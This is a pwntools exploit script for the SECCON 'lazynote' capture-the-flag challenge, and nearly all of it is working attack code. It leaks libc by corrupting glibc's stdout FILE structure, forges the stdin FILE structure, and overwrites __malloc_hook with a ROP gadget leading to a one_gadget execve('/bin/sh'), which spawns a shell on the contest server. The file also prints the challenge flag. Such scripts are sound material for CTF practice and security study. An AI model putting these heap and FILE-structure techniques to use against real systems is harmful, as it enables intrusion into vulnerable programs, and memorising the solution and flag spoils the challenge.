#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
BINARY = 'lazynote/chall'


def connect():
    if args.LOCAL:
        return gdb.debug([BINARY], gdbscript='''
b *(main - 0xb2f + 0xb0d)
c
''')
    else:
        return remote('pwn-neko.chal.seccon.jp', 9003)


def babyheap(tube, alloc_size, read_size, data, expect):
    if expect:
        tube.recvuntil(b'\n> ')
    tube.sendline(b'1')
    if expect:
        tube.recvuntil(b'alloc size: ')
    tube.sendline(str(alloc_size))
    if expect:
        tube.recvuntil(b'read size: ')
    tube.sendline(str(read_size))
    if expect:
        tube.recvuntil(b'data: ')
    tube.sendline(data)


def main():
    stdout_read_end = 0x3ec770  # &_IO_2_1_stdout_.file._IO_read_end
    stdout_write_base = 0x3ec780  # &_IO_2_1_stdout_.file._IO_write_base
    stdin_buf_base = 0x3eba38  # &_IO_2_1_stdin_.file._IO_buf_base
    stdin = 0x3eba00  # &_IO_2_1_stdin_
    stdin_old_offset = 0x3eba78  # &_IO_2_1_stdin_.file._old_offset
    malloc_hook = 0x3ebc30  # &__malloc_hook
    add_rsp_0x40_ret = 0x125057

    # 0x4f365 execve("/bin/sh", rsp+0x40, environ)
    # constraints:
    #   rsp & 0xf == 0
    #   rcx == NULL
    #
    # 0x4f3c2 execve("/bin/sh", rsp+0x40, environ)
    # constraints:
    #   [rsp+0x40] == NULL
    #
    # 0x10a45c execve("/bin/sh", rsp+0x70, environ)
    # constraints:
    #   [rsp+0x70] == NULL
    one = 0x10a45c

    with connect() as tube:
        # Large enough to not fit into glibc-ld.so gap.
        mmap_size = 8 * 1024 * 1024
        # We want to mmap exactly mmap_size bytes, but glibc mmaps ROUND_UP(
        # mmap_size + margin, PAGE_SIZE). Don't bother with the exact value of
        # margin.
        margin = 0x100
        chunk_size = 0x10

        # Placate this check:
        #
        # static
        # _IO_size_t
        # new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
        # {
        # ...
        #   else if (fp->_IO_read_end != fp->_IO_write_base)
        #     {
        #       _IO_off64_t new_pos
        #         = _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
        #       if (new_pos == _IO_pos_BAD)
        #         return 0;
        babyheap(
            tube=tube,
            alloc_size=mmap_size - margin,
            read_size=mmap_size - chunk_size + stdout_read_end + 1,
            data=b'sosipisos'[::-1],
            expect=True,
        )

        # Write 0 to _IO_write_base LSB to get a leak from this call:
        #
        # int
        # _IO_new_file_overflow (_IO_FILE *f, int ch)
        # {
        # ...
        #     if (_IO_do_write (f, f->_IO_write_base,
        #                       f->_IO_write_ptr - f->_IO_write_base) == EOF)
        babyheap(
            tube=tube,
            alloc_size=mmap_size - margin,
            read_size=mmap_size * 2 - chunk_size + stdout_write_base + 1,
            data=b'sosipisos'[::-1],
            expect=False,
        )

        # Sort the swag
        tube.recvuntil(struct.pack('<Q', 0))
        leak, = struct.unpack('<Q', tube.recv(8))
        print(f'leak = 0x{leak:016x}')
        libc = leak - 0x3ed8b0
        print(f'libc = 0x{libc:016x}')
        assert libc & 0xfff == 0

        # There is no one_gadget whose containt is satisfied when it's called
        # from malloc_hook. Put a small ROP gadget in between to fix this.
        # When malloc_hook is called, one_gadget address will be at [rsp+0x40].
        tmp = libc + one
        tmp_hi = tmp >> 32
        tmp_lo = tmp & 0xffffffff
        assert tmp_hi & 0x80000000 == 0, hex(tmp_hi)
        assert tmp_lo & 0x80000000 == 0, hex(tmp_lo)
        reply_str = f'{tmp_lo}\n{tmp_hi}\n'.encode()

        # Write 0 to _IO_buf_base LSB using this call:
        #
        # int
        # _IO_new_file_underflow (_IO_FILE *fp)
        # {
        # ...
        #   count = _IO_SYSREAD (fp, fp->_IO_buf_base,
        #                        fp->_IO_buf_end - fp->_IO_buf_base);
        babyheap(
            tube=tube,
            alloc_size=mmap_size - margin,
            read_size=mmap_size * 3 - chunk_size + stdin_buf_base + 1,
            data=b'sosipisos'[::-1],
            expect=False,
        )

        # After the overwrite, _IO_buf_base happens to point to _IO_2_1_stdin_
        # and the next 132 bytes we send to stdin will end up there.
        # The catch is: we need the next fgets() operation to return "1\n".
        #
        # Inside glibc, the overwrite will happen as follows: first, in
        # _IO_new_file_underflow() _IO_SYSREAD() will overwrite 132 bytes of
        # _IO_2_1_stdin_, and then _IO_default_uflow() and others will take the
        # bytes to return from _IO_read_ptr.
        pkt_size = 132
        pkt = b''.join((
            struct.pack('<I', 0xfbad208b),  # _flags
            struct.pack('<I', 0),  # hole
            struct.pack('<Q', libc + stdin_old_offset),  # _IO_read_ptr
            struct.pack('<Q', libc + stdin_old_offset + 2 - pkt_size),  # _IO_read_end
            struct.pack('<Q', libc + stdin_old_offset),  # _IO_read_base
            struct.pack('<Q', libc + stdin + 131),  # _IO_write_base
            struct.pack('<Q', libc + stdin + 131),  # _IO_write_ptr
            struct.pack('<Q', libc + stdin + 131),  # _IO_write_end
            struct.pack('<Q', libc + malloc_hook - len(reply_str)),  # _IO_buf_base
            struct.pack('<Q', libc + malloc_hook + 8),  # _IO_buf_end
            struct.pack('<Q', 0),  # _IO_save_base
            struct.pack('<Q', 0),  # _IO_backup_base
            struct.pack('<Q', 0),  # _IO_save_end
            struct.pack('<Q', 0),  # _markers
            struct.pack('<Q', 0),  # _chain
            struct.pack('<I', 0),  # _fileno and
            struct.pack('<I', 0),  # _flags2
            struct.pack('<Q', 0xffffffffffff0a31),  # _old_offset - let's abuse it for reply, should be ok as long as it's negative
            struct.pack('<H', 0),  # _cur_column
            struct.pack('<B', 0),  # _vtable_offset
            struct.pack('<B', 0xa),  # _shortbuf = {'\n'}
        ))
        '''
            struct.pack('<I', 0),  # hole
            struct.pack('<Q', libc + 0x3ed8d0),  # _lock = _IO_stdfile_0_lock
            struct.pack('<Q', 0xffffffffffffffff),  # _offset
            struct.pack('<Q', 0),  # _codecvt
            struct.pack('<Q', libc + 0x3ebae0),  # _wide_data = _IO_wide_data_0
            struct.pack('<Q', 0),  # _freeres_list
            struct.pack('<Q', 0),  # _freeres_buf
            struct.pack('<Q', 0),  # __pad5
            struct.pack('<I', 0xffffffff),  # _mode
            b'\x00' * 20,  # _unused2
            struct.pack('<Q', 0x012345678abcdef),  # _vtable
        '''
        assert len(pkt) == pkt_size, len(pkt)
        tube.send(pkt)

        # After the overwrite, the next 2 bytes will be taken from the abused
        # _old_offset field and will be used as top menu choice. After that
        # _IO_read_ptr will become equal to _IO_read_end, and we'll have to
        # read data from stdin. This data will end up at _IO_buf_base, which
        # points to malloc_hook - len(reply_str). The first len(reply_str)
        # bytes will be reply_str, and the next 8 will be the new malloc_hook.
        tube.send(reply_str + struct.pack('<Q', libc + add_rsp_0x40_ret))

        tube.interactive()  # SECCON{r3l4t1v3_nu11_wr1t3_pr1m1t1v3_2_sh3ll}


if __name__ == '__main__':
    main()
